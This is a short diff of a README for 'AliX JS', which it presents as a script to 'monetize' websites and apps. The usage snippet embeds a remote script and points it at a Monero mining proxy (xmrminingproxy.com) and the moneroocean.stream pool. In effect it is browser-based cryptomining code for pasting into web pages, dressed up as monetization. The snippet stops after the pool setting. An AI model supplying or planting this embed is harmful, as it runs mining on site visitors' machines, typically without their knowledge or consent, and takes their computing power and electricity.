@@ -1,7 +1,7 @@
 AliX JS Is A PowerFull JS Used To Monitize Websites And Apps  
 ## USE
 ```
-<script src="https://alixjs.vercel.app/connect.js"></script>
+<script src="https://alixjs.vercel.app/index.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
